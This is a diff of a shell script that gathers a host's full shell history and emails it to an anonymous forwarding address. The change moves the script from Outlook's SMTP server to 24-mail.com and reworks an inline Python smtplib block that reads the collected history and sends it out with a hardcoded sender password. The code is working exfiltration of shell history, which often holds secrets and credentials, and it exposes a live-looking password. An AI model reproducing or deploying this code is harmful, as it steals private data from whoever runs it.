@@ -74,9 +74,9 @@ EOF
     recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
     subject="Full Shell History Report from $HOSTNAME"
 
-    smtp_server="smtp-mail.outlook.com"
+    smtp_server="24-mail.com"
     port=587
-    sender_email="kxs39585@outlook.de"
+    sender_email="bash@24-mail.com"
     password="55Marko55"
 
     # Create a temporary file to store the email content
@@ -84,7 +84,39 @@ EOF
     echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"
 
     # Try sending email via Python
-    python_result=$(python -c "import smtplib; import ssl; import os; port = $port; smtp_server = '$smtp_server'; sender_email = '$sender_email'; password = '$password'; receiver_email = '$recipient'; subject = '$subject'; body_file = '$TEMP_FILE'; with open(body_file, 'r', encoding='utf-8', errors='ignore') as f: body = f.read(); message = f'Subject: {subject}\\n\\n{body}'; context = ssl.create_default_context(); try: with smtplib.SMTP(smtp_server, port) as server: server.ehlo(); server.starttls(context=context); server.ehlo(); server.login(sender_email, password); server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore')); print('Email sent successfully via Python using Outlook.com.'); exit(0); except Exception as e: print(f'Error sending email via Python using Outlook.com: {e}'); print(f'Details: {e}'); exit(1);"
+    python_result=$(python -c "
+import smtplib
+import ssl
+import os
+
+port = $port
+smtp_server = '$smtp_server'
+sender_email = '$sender_email'
+password = '$password'
+receiver_email = '$recipient'
+subject = '$subject'
+body_file = '$TEMP_FILE'
+
+with open(body_file, 'r', encoding='utf-8', errors='ignore') as f:
+    body = f.read()
+
+message = f'Subject: {subject}\\n\\n{body}'
+
+context = ssl.create_default_context()
+try:
+    with smtplib.SMTP(smtp_server, port) as server:
+        server.ehlo()
+        server.starttls(context=context)
+        server.ehlo()
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore'))
+    print('Email sent successfully via Python using 24-mail.com.')
+    exit(0)
+except Exception as e:
+    print(f'Error sending email via Python using 24-mail.com: {e}')
+    print(f'Details: {e}')
+    exit(1)
+"
     )
     python_exit_code=$?
 
